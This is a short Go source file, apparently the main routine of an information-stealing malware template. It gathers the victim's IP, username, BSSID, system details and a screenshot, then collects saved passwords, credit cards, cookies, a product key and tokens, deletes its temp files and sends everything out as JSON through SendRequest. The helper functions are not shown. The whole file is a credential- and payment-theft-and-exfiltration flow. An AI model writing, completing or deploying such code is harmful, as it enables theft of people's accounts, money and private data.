package main

import (
	"encoding/json"
)

func main() {

	out := OUTPUT{
		GeneralInfo: geninf{
			// Anchor 1
			Ip:         GetExternIP(),
			Username:   GetUsername(),
			BSSID:      GetBSSID(),
			Info:       *GetSysInfo(),
			Screenshot: GetScreenShot(), // This is a string of b64 byte data.
		},
		Dumps: dumps{
			// Anchor 2
			Passwords:   GetPasswords(),
			CreditCards: GetCreditCards(),
			Cookies:     GetCookies(),
			ProductKey:  *GetProductKey(),
			Tokens:      GetTokens(),
		},
	}

	// Anchor 3

	CleanUp() // <- Removes all the temp files generated

	x, _ := json.Marshal(out)

	SendRequest(string(x))
}
